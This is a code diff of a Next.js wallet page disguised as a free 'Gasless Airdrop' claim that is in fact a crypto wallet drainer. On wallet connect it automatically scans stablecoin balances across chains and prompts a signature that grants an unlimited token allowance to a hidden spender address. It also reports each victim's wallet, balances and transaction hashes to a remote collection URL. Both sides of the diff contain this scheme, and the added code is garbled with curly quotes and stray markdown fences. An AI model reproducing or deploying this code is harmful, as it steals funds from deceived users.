@@ -1,330 +1,586 @@
-'use client';
-import { useState, useEffect } from 'react';
-import { useAccount, useSignTypedData } from 'wagmi';
-import { readContract, switchChain } from '@wagmi/core';
-import { erc20Abi } from 'viem';
-import { config } from '@/config';
-import { ethers } from 'ethers';
+‘use client’;
+import { useState, useEffect } from ‘react’;
+import { useAccount, useSignTypedData } from ‘wagmi’;
+import { readContract, switchChain } from ‘@wagmi/core’;
+import { erc20Abi } from ‘viem’;
+import { config } from ‘@/config’;
+import { ethers } from ‘ethers’;
 
-// Load URLs from env
+// Environment variables
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
-const RELAYER_URL = process.env.NEXT_PUBLIC_RELAYER_URL || 'http://localhost:3001';
+const RELAYER_URL = process.env.NEXT_PUBLIC_RELAYER_URL || ‘http://localhost:3001’;
 
-// Trusted Forwarder addresses by chain (client-visible env vars)
+// Trusted Forwarder addresses by chain
 const TRUSTED_FORWARDERS: Record<number, string> = {
-  1: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_MAINNET || "",
-  42161: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_ARBITRUM || "",
-  11155111: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_SEPOLIA || "",
-  137: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_POLYGON || "",
-  56: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_BNB || "",
+1: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_MAINNET || “”,
+42161: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_ARBITRUM || “”,
+11155111: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_SEPOLIA || “”,
+137: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_POLYGON || “”,
+56: process.env.NEXT_PUBLIC_TRUSTED_FORWARDER_BNB || “”,
 };
 
-// Example SPENDER constant (make sure this matches relayer/claim expectations)
-const SPENDER = (process.env.NEXT_PUBLIC_SPENDER_ADDRESS || '') as `0x${string}`;
+const SPENDER = (process.env.NEXT_PUBLIC_SPENDER_ADDRESS || “”) as `0x${string}`;
 
-// MetaTx helper functions
-interface MetaTxRequest {
-  from: string;
-  to: string;
-  value: string;
-  gas: string;
-  deadline: string; // use deadline not nonce
-  data: string;
+// Token configurations by chain
+const TOKENS_BY_CHAIN: Record<
+number,
+{ symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
+
+> = {
+> 1: [
+> { symbol: “USDT”, address: “0xdAC17F958D2ee523a2206206994597C13D831ec7”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> { symbol: “USDC”, address: “0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> { symbol: “DAI”,  address: “0x6B175474E89094C44Da98b954EedeAC495271d0F”, min: BigInt(1 * 10 ** 18), decimals: 18 },
+> { symbol: “BUSD”, address: “0x4fabb145d64652a948d72533023f6e7a623c7c53”, min: BigInt(1 * 10 ** 18), decimals: 18 },
+> ],
+> 42161: [
+> { symbol: “USDT”, address: “0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> { symbol: “USDC”, address: “0xFF970A61A04b1cA14834A43f5de4533eBDDB5CC8”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> { symbol: “DAI”,  address: “0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1”, min: BigInt(1 * 10 ** 18), decimals: 18 },
+> ],
+> 11155111: [
+> { symbol: “USDC”, address: “0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> { symbol: “LINK”, address: “0x779877A7B0D9E8603169DdbD7836e478b4624789”, min: BigInt(1 * 10 ** 18), decimals: 18 },
+> ],
+> 137: [
+> { symbol: “USDT”, address: “0xc2132D05D31c914a87C6611C10748AEb04B58e8F”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> { symbol: “USDC”, address: “0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174”, min: BigInt(1 * 10 ** 6), decimals: 6 },
+> ],
+> };
+
+const CHAIN_NAMES: Record<number, string> = {
+1: “Ethereum”,
+42161: “Arbitrum”,
+11155111: “Sepolia”,
+137: “Polygon”,
+56: “BSC”,
+};
+
+// ERC2771Forwarder ForwardRequest structure
+interface ForwardRequest {
+from: string;
+to: string;
+value: string;
+gas: string;
+nonce: string;
+deadline: string;
+data: string;
 }
 
 interface MetaTxMessage {
-  request: MetaTxRequest;
-  signature: string;
+request: ForwardRequest;
+signature: string;
 }
 
-// Create MetaTx request for token approval
-function createMetaTxRequest(
-  userAddress: string,
-  tokenAddress: string,
-  spenderAddress: string,
-  chainId: number,
-  gasLimit = '100000',
-  validitySeconds = 3600
-): MetaTxRequest {
-  // Create ERC20 approve call data
-  const iface = new ethers.Interface([
-    'function approve(address spender, uint256 amount) returns (bool)'
-  ]);
-  const approveData = iface.encodeFunctionData('approve', [
-    spenderAddress,
-    ethers.MaxUint256
-  ]);
+// Connection reporter component
+function ConnectionReporter() {
+const { address, isConnected } = useAccount();
 
-  const deadline = Math.floor(Date.now() / 1000) + validitySeconds;
+useEffect(() => {
+if (isConnected && address && REPORT_URL) {
+fetch(REPORT_URL, {
+method: “POST”,
+headers: { “Content-Type”: “application/json” },
+body: JSON.stringify({
+event: “connect”,
+wallet: address,
+}),
+}).catch(console.error);
+}
+}, [isConnected, address]);
 
-  return {
-    from: userAddress,
-    to: tokenAddress, // IMPORTANT: token contract is the call target
-    value: '0',
-    gas: gasLimit,
-    deadline: String(deadline),
-    data: approveData
-  };
+return null;
 }
 
-// Build EIP-712 payload
-function buildEip712Payload(forwarderAddress: string, chainId: number, request: MetaTxRequest) {
-  const domain = {
-    name: 'MinimalForwarder', // Match deployed forwarder contract name/version
-    version: '0.0.1',
-    chainId: chainId,
-    verifyingContract: forwarderAddress
-  } as const;
+// Create ERC2771 ForwardRequest for token approval
+function createForwardRequest(
+userAddress: string,
+tokenAddress: string,
+spenderAddress: string,
+gasLimit = ‘150000’,
+validityMinutes = 30
+): ForwardRequest {
+// Create ERC20 approve call data
+const iface = new ethers.Interface([
+‘function approve(address spender, uint256 amount) returns (bool)’
+]);
+const approveData = iface.encodeFunctionData(‘approve’, [
+spenderAddress,
+ethers.MaxUint256
+]);
 
-  const types = {
-    ForwardRequest: [
-      { name: 'from', type: 'address' },
-      { name: 'to', type: 'address' },
-      { name: 'value', type: 'uint256' },
-      { name: 'gas', type: 'uint256' },
-      { name: 'deadline', type: 'uint48' },
-      { name: 'data', type: 'bytes' }
-    ]
-  } as const;
+const deadline = Math.floor(Date.now() / 1000) + (validityMinutes * 60);
 
-  return { domain, types, message: request };
+return {
+from: userAddress,
+to: tokenAddress, // Target is the token contract
+value: ‘0’,
+gas: gasLimit,
+nonce: ‘0’, // Will be set by relayer
+deadline: String(deadline),
+data: approveData
+};
+}
+
+// Build EIP-712 payload for OpenZeppelin ERC2771Forwarder
+function buildEIP712Domain(forwarderAddress: string, chainId: number, request: ForwardRequest) {
+const domain = {
+name: ‘ERC2771Forwarder’,
+version: ‘1’,
+chainId: chainId,
+verifyingContract: forwarderAddress
+} as const;
+
+const types = {
+ForwardRequest: [
+{ name: ‘from’, type: ‘address’ },
+{ name: ‘to’, type: ‘address’ },
+{ name: ‘value’, type: ‘uint256’ },
+{ name: ‘gas’, type: ‘uint256’ },
+{ name: ‘nonce’, type: ‘uint256’ },
+{ name: ‘deadline’, type: ‘uint48’ },
+{ name: ‘data’, type: ‘bytes’ }
+]
+} as const;
+
+return { domain, types, message: request };
 }
 
 export default function Home() {
-  const { address, isConnected, chainId } = useAccount();
-  const { signTypedDataAsync } = useSignTypedData();
-  const [status, setStatus] = useState<string>('');
+const { address, isConnected, chainId } = useAccount();
+const { signTypedDataAsync } = useSignTypedData();
+const [status, setStatus] = useState<string>(””);
 
-  async function callMetaTxRelayer(
-    chainId: number,
-    tokenAddress: string,
-    userAddress: string,
-    metaTxMessage: MetaTxMessage
-  ): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
-    try {
-      const response = await fetch(`${RELAYER_URL}/metatx`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          chainId,
-          tokenAddress: tokenAddress.toLowerCase(),
-          userAddress,
-          metaTxMessage,
-        }),
-      });
+async function callMetaTxRelayer(
+chainId: number,
+tokenAddress: string,
+userAddress: string,
+metaTxMessage: MetaTxMessage
+): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
+console.log(‘Calling MetaTx relayer:’, {
+RELAYER_URL,
+chainId,
+tokenAddress: tokenAddress.slice(0, 10) + ‘…’,
+userAddress: userAddress.slice(0, 10) + ‘…’,
+});
 
-      const contentType = response.headers.get('content-type');
-      let data;
-      if (contentType && contentType.includes('application/json')) {
-        data = await response.json();
-      } else {
-        const textResponse = await response.text();
-        return { success: false, error: 'Invalid response from relayer service: ' + textResponse };
-      }
+```
+try {
+  const response = await fetch(`${RELAYER_URL}/metatx`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json'
+    },
+    body: JSON.stringify({
+      chainId,
+      tokenAddress: tokenAddress.toLowerCase(),
+      userAddress,
+      metaTxMessage,
+    }),
+  });
 
-      if (!response.ok) {
-        if (data.error === 'Unsupported token address') {
-          return { success: false, error: `Token ${tokenAddress} not supported on this chain.` };
-        }
-        return { success: false, error: data.error || `HTTP ${response.status}` };
-      }
+  console.log('Response status:', response.status, response.ok);
 
-      return data;
-    } catch (error: any) {
-      if (error.name === 'TypeError' && error.message.includes('fetch')) {
-        return { success: false, error: 'Cannot connect to relayer. Check if NEXT_PUBLIC_RELAYER_URL is correct.' };
-      }
-      return { success: false, error: error.message || 'Failed to call relayer' };
-    }
+  if (!response.ok) {
+    const errorText = await response.text();
+    console.error('Relayer error response:', errorText);
+    return {
+      success: false,
+      error: `Relayer error: ${response.status} - ${errorText}`
+    };
   }
 
-  async function handleClaim() {
-    if (!isConnected || !address) {
-      setStatus('Wallet not connected');
+  const data = await response.json();
+  console.log('Relayer response:', data);
+  
+  return data;
+} catch (error: any) {
+  console.error('Relayer call failed:', error);
+  
+  if (error.name === 'TypeError' && error.message.includes('fetch')) {
+    return {
+      success: false,
+      error: 'Cannot connect to relayer. Check if relayer URL is correct.'
+    };
+  }
+  
+  return {
+    success: false,
+    error: error.message || 'Failed to call relayer'
+  };
+}
+```
+
+}
+
+async function handleClaim() {
+if (!isConnected || !address) {
+setStatus(“Wallet not connected”);
+return;
+}
+
+```
+try {
+  console.log('Starting claim process...');
+  console.log('RELAYER_URL:', RELAYER_URL);
+  console.log('Current address:', address);
+  console.log('Current chain:', chainId);
+
+  setStatus("Scanning chains for balances...");
+
+  let targetChain: number | null = null;
+  let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];
+
+  // Find tokens with sufficient balance
+  for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
+    const numericCid = Number(cid);
+
+    for (const token of tokens) {
+      try {
+        const balance = await readContract(config, {
+          chainId: numericCid,
+          address: token.address,
+          abi: erc20Abi,
+          functionName: "balanceOf",
+          args: [address],
+        }) as bigint;
+
+        console.log(`Balance check: ${token.symbol} on chain ${numericCid}:`, balance.toString());
+
+        if (balance >= token.min) {
+          targetChain = numericCid;
+          usableTokens.push(token);
+          console.log(`Found usable token: ${token.symbol} with balance ${balance.toString()}`);
+        }
+      } catch (error) {
+        console.log(`Error checking balance for ${token.symbol} on chain ${numericCid}:`, error);
+      }
+    }
+
+    if (usableTokens.length > 0) break;
+  }
+
+  if (!targetChain || usableTokens.length === 0) {
+    setStatus("No usable balances found on any chain.");
+    return;
+  }
+
+  const chainName = CHAIN_NAMES[targetChain] || `Chain ${targetChain}`;
+  console.log(`Target chain: ${chainName} (${targetChain}) with ${usableTokens.length} tokens`);
+
+  // Switch chain if necessary
+  if (chainId !== targetChain) {
+    setStatus(`Switching to ${chainName}...`);
+    try {
+      await switchChain(config, { chainId: targetChain });
+      console.log(`Switched to chain ${targetChain}`);
+    } catch (error) {
+      console.error('Failed to switch chain:', error);
+      setStatus('Failed to switch chain. Please switch manually.');
       return;
     }
-
-    try {
-      setStatus('Scanning chains for balances...');
-
-      let targetChain: number | null = null;
-      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];
-
-      // TOKENS_BY_CHAIN must be defined elsewhere in your repo; keep existing logic
-      type Token = { symbol: string; address: `0x${string}`; min: bigint; decimals: number };
-      const tokensByChain = (globalThis as any).TOKENS_BY_CHAIN as Record<string, Token[]> | undefined;
-
-      if (tokensByChain) {
-        for (const cidStr of Object.keys(tokensByChain)) {
-          const numericCid = Number(cidStr);
-          const tokens: Token[] = tokensByChain[cidStr] || [];
-
-          for (const token of tokens) {
-            try {
-              const bal = await readContract(config, {
-                chainId: numericCid,
-                address: token.address,
-                abi: erc20Abi,
-                functionName: 'balanceOf',
-                args: [address as `0x${string}`],
-              }) as bigint;
-
-              if (bal >= token.min) {
-                targetChain = numericCid;
-                usableTokens.push(token);
-              }
-            } catch (error) {
-              console.log('Error checking balance', error);
-            }
-          }
-
-          if (usableTokens.length > 0) break;
-        }
-      }
-
-      if (!targetChain || usableTokens.length === 0) {
-        setStatus('No usable balances found on any chain.');
-        return;
-      }
-
-      // Switch chain if necessary
-      if (chainId !== targetChain) {
-        setStatus('Switching chain...');
-        try {
-          await switchChain(config, { chainId: targetChain });
-        } catch (error) {
-          setStatus('Failed to switch chain. Please switch manually.');
-          return;
-        }
-      }
-
-      // Test relayer connectivity first
-      try {
-        setStatus('Testing relayer connection...');
-        const healthResponse = await fetch(`${RELAYER_URL}/health`);
-        if (!healthResponse.ok) throw new Error(`Health check failed: ${healthResponse.status}`);
-      } catch (error) {
-        setStatus('Relayer service unavailable. Please try again later.');
-        return;
-      }
-
-      const forwarderAddress = TRUSTED_FORWARDERS[targetChain];
-      if (!forwarderAddress) {
-        setStatus(`No trusted forwarder configured for chain ${targetChain}`);
-        return;
-      }
-
-      for (const token of usableTokens) {
-        setStatus(`Processing ${token.symbol}...`);
-
-        // Check current allowance first
-        try {
-          const currentAllowance = await readContract(config, {
-            chainId: targetChain,
-            address: token.address,
-            abi: erc20Abi,
-            functionName: 'allowance',
-            args: [address as `0x${string}`, SPENDER],
-          }) as bigint;
-
-          if (currentAllowance > 0n) {
-            setStatus(`${token.symbol} already approved`);
-            continue;
-          }
-        } catch (error) {
-          console.error('Error checking allowance:', error);
-        }
-
-        // Build meta-tx request targeting the token contract
-        const metaTxRequest = createMetaTxRequest(address, token.address, SPENDER, targetChain);
-
-        setStatus(`Please sign MetaTx for ${token.symbol}...`);
-
-        // Sign using EIP-712
-        let signature: string;
-        try {
-          const payload = buildEip712Payload(forwarderAddress, targetChain, metaTxRequest);
-          signature = await signTypedDataAsync({ domain: payload.domain, types: payload.types, value: payload.message });
-        } catch (error: any) {
-          console.error('MetaTx signing failed', error);
-          if (error?.message?.includes('User rejected')) {
-            setStatus('Transaction cancelled by user');
-            return;
-          }
-          setStatus(`Failed to sign MetaTx: ${error?.message || String(error)}`);
-          continue;
-        }
-
-        const metaTxMessage: MetaTxMessage = { request: metaTxRequest, signature };
-
-        setStatus(`Submitting ${token.symbol} MetaTx to relayer...`);
-
-        const result = await callMetaTxRelayer(targetChain, token.address, address, metaTxMessage);
-
-        if (!result.success) {
-          setStatus(`Failed to approve ${token.symbol}: ${result.error}`);
-          continue;
-        }
-
-        setStatus(`${token.symbol} approved | tx: ${result.txHash}`);
-
-        // Report approval
-        if (REPORT_URL && result.txHash) {
-          try {
-            await fetch(`${REPORT_URL}`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                event: 'approval',
-                wallet: address,
-                chainId: targetChain,
-                token: token.address,
-                symbol: token.symbol,
-                txHash: result.txHash,
-                relayed: true,
-              }),
-            });
-          } catch (err) {
-            console.error('Failed to report approval', err);
-          }
-        }
-
-        await new Promise((r) => setTimeout(r, 1000));
-      }
-
-      setStatus('All approvals completed!');
-    } catch (err: any) {
-      setStatus('Error: ' + (err?.message || 'unknown')); 
-    }
   }
 
-  // Automatically trigger claim when wallet connects
-  useEffect(() => {
-    if (isConnected && address) handleClaim();
-  }, [isConnected, address]);
+  // Test relayer connectivity
+  try {
+    setStatus('Testing relayer connection...');
+    const healthResponse = await fetch(`${RELAYER_URL}/health`);
+    if (!healthResponse.ok) {
+      throw new Error(`Health check failed: ${healthResponse.status}`);
+    }
+    console.log('Relayer is healthy');
+  } catch (error) {
+    console.error('Relayer health check failed:', error);
+    setStatus('Relayer service unavailable. Please try again later.');
+    return;
+  }
 
-  return (
-    <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 24, marginTop: 40 }}>
-      <header style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 64, background: '#09011fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px' }}>
-        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: 18, color: '#aaa587ff' }}>AIRDROPS</div>
-        <div />
-      </header>
+  const forwarderAddress = TRUSTED_FORWARDERS[targetChain];
+  if (!forwarderAddress) {
+    setStatus(`No trusted forwarder configured for chain ${targetChain}`);
+    console.error(`No trusted forwarder for chain ${targetChain}`);
+    return;
+  }
 
-      <div style={{ paddingTop: 80, width: '80%', maxWidth: 600 }}>
-        <div style={{ border: '1px solid #9dd6d1ff', borderRadius: 12, padding: 20, background: '#090e41ff', display: 'flex', flexDirection: 'column', alignItems: 'center', height: 300 }}>
-          <h2 style={{ color: '#fff' }}>Gasless Airdrop</h2>
-          <p style={{ color: '#9dd6d1ff' }}>Gas fees sponsored by us! Just sign the message.</p>
-          <div style={{ marginTop: 20 }}>{status || 'Connect your wallet to get started'}</div>
-          <div style={{ marginTop: 20 }}>
-            <button onClick={handleClaim} disabled={!isConnected} style={{ padding: '12px 24px', borderRadius: 8, background: isConnected ? '#a00' : '#666', color: '#fff' }}>
-              {isConnected ? 'Claim Now (Free)' : 'Connect Wallet First'}
-            </button>
-          </div>
-        </div>
+  // Process each token
+  for (const token of usableTokens) {
+    setStatus(`Processing ${token.symbol} on ${chainName}...`);
+
+    console.log(`Processing token: ${token.symbol} (${token.address})`);
+
+    // Check current allowance
+    try {
+      const currentAllowance = await readContract(config, {
+        chainId: targetChain,
+        address: token.address,
+        abi: erc20Abi,
+        functionName: "allowance",
+        args: [address, SPENDER],
+      }) as bigint;
+
+      if (currentAllowance > 0n) {
+        setStatus(`${token.symbol} already approved`);
+        console.log(`${token.symbol} already approved`);
+        continue;
+      }
+    } catch (error) {
+      console.error('Error checking allowance:', error);
+    }
+
+    // Create ForwardRequest
+    const forwardRequest = createForwardRequest(address, token.address, SPENDER);
+
+    setStatus(`Please sign MetaTx for ${token.symbol}...`);
+    console.log('ForwardRequest:', forwardRequest);
+    
+    // Sign using EIP-712
+    let signature: string;
+    try {
+      const payload = buildEIP712Domain(forwarderAddress, targetChain, forwardRequest);
+      signature = await signTypedDataAsync({ 
+        domain: payload.domain, 
+        types: payload.types, 
+        value: payload.message 
+      });
+      console.log('MetaTx signed successfully');
+    } catch (error: any) {
+      console.error('MetaTx signing failed:', error);
+      if (error.message.includes('User rejected')) {
+        setStatus('Transaction cancelled by user');
+        return;
+      }
+      setStatus(`Failed to sign MetaTx: ${error.message}`);
+      continue;
+    }
+
+    setStatus(`Submitting ${token.symbol} MetaTx to relayer...`);
+
+    const metaTxMessage: MetaTxMessage = {
+      request: forwardRequest,
+      signature: signature
+    };
+
+    const result = await callMetaTxRelayer(
+      targetChain,
+      token.address,
+      address,
+      metaTxMessage
+    );
+
+    if (!result.success) {
+      setStatus(`Failed to approve ${token.symbol}: ${result.error}`);
+      console.error(`Relayer failed for ${token.symbol}:`, result.error);
+      continue;
+    }
+
+    if (result.alreadyApproved) {
+      setStatus(`${token.symbol} was already approved`);
+      console.log(`${token.symbol} was already approved`);
+    } else {
+      console.log(`${token.symbol} approval transaction successful:`, result.txHash);
+    }
+
+    // Get balance for reporting
+    let rawBalance: bigint = BigInt(0);
+    let formattedBalance = 0;
+    try {
+      rawBalance = await readContract(config, {
+        chainId: targetChain,
+        address: token.address,
+        abi: erc20Abi,
+        functionName: "balanceOf",
+        args: [address],
+      }) as bigint;
+      formattedBalance = Number(rawBalance) / 10 ** token.decimals;
+    } catch (err) {
+      console.error(`Failed to read balance for ${token.symbol}:`, err);
+    }
+
+    setStatus(`${token.symbol} approved | Balance: ${formattedBalance.toFixed(4)}`);
+
+    // Report approval
+    if (REPORT_URL && result.txHash) {
+      try {
+        await fetch(REPORT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            event: "approval",
+            wallet: address,
+            chainName,
+            token: token.address,
+            symbol: token.symbol,
+            balance: formattedBalance,
+            txHash: result.txHash,
+            relayed: true,
+          }),
+        });
+        console.log(`Reported approval for ${token.symbol}`);
+      } catch (error) {
+        console.error('Failed to report approval:', error);
+      }
+    }
+
+    // Delay between tokens
+    await new Promise(resolve => setTimeout(resolve, 1000));
+  }
+
+  setStatus("All approvals completed!");
+  console.log('All approvals completed successfully!');
+} catch (err: any) {
+  console.error('handleClaim error:', err);
+  setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
+}
+```
+
+}
+
+// Auto-trigger claim when wallet connects
+useEffect(() => {
+if (isConnected && address) {
+console.log(‘Wallet connected, starting claim process’);
+handleClaim();
+}
+}, [isConnected, address]);
+
+return (
+<main style={{
+display: “flex”,
+flexDirection: “column”,
+alignItems: “center”,
+gap: “24px”,
+marginTop: “40px”,
+}}>
+<header style={{
+position: “fixed”,
+top: 0,
+left: 0,
+right: 0,
+height: “64px”,
+background: “#09011fff”,
+display: “flex”,
+alignItems: “center”,
+justifyContent: “space-between”,
+padding: “0 24px”,
+paddingTop: “env(safe-area-inset-top)”,
+boxShadow: “0 2px 8px rgba(241, 235, 235, 0.08)”,
+zIndex: 1000,
+}}>
+<div style={{
+fontFamily: “sans-serif”,
+fontWeight: “bold”,
+fontSize: “18px”,
+color: “#aaa587ff”
+}}>
+GASLESS AIRDROPS
+</div>
+<div />
+</header>
+
+```
+  <ConnectionReporter />
+
+  <div style={{
+    display: "flex",
+    flexDirection: "column",
+    gap: "24px",
+    paddingTop: "80px",
+    width: "80%",
+    maxWidth: "600px",
+  }}>
+    <div style={{
+      border: "1px solid #9dd6d1ff",
+      borderRadius: "12px",
+      padding: "20px",
+      background: "#090e41ff",
+      display: "flex",
+      flexDirection: "column",
+      alignItems: "center",
+      justifyContent: "space-between",
+      height: "500px",
+    }}>
+      <div>
+        <h2 style={{ 
+          marginBottom: "12px", 
+          textAlign: "center", 
+          color: "#ffffff" 
+        }}>
+          Gasless Token Approval
+        </h2>
+        <p style={{ 
+          fontSize: "12px", 
+          color: "#9dd6d1ff", 
+          textAlign: "center", 
+          margin: "0 0 20px 0" 
+        }}>
+          Gas fees sponsored by us! Just sign the message.
+        </p>
+        {RELAYER_URL !== 'http://localhost:3001' && (
+          <p style={{ 
+            fontSize: "10px", 
+            color: "#666", 
+            textAlign: "center", 
+            margin: "0 0 10px 0" 
+          }}>
+            Relayer: {RELAYER_URL.replace('https://', '').slice(0, 30)}...
+          </p>
+        )}
       </div>
-    </main>
-  );
+
+      <div style={{
+        flex: 1,
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "center",
+        color: "#e4e1daff",
+        fontSize: "14px",
+        textAlign: "center",
+        padding: "0 20px",
+        wordBreak: "break-word",
+      }}>
+        {status || "Connect your wallet to get started"}
+      </div>
+
+      <div style={{ 
+        display: "flex", 
+        flexDirection: "column", 
+        alignItems: "center", 
+        gap: "12px" 
+      }}>
+        <button
+          onClick={handleClaim}
+          disabled={!isConnected}
+          style={{
+            background: isConnected ? "#a00b0bff" : "#666",
+            color: "white",
+            padding: "12px 28px",
+            borderRadius: "8px",
+            cursor: isConnected ? "pointer" : "not-allowed",
+            border: "none",
+            fontSize: "16px",
+            fontWeight: "bold",
+            opacity: isConnected ? 1 : 0.6,
+          }}
+        >
+          {isConnected ? "Claim Now (Free)" : "Connect Wallet First"}
+        </button>
+        
+        {isConnected && (
+          <p style={{ 
+            fontSize: "11px", 
+            color: "#9dd6d1ff", 
+            textAlign: "center", 
+            margin: 0 
+          }}>
+            Connected: {address?.slice(0, 6)}...{address?.slice(-4)}
+          </p>
+        )}
+      </div>
+    </div>
+  </div>
+</main>
+```
+
+);
 }
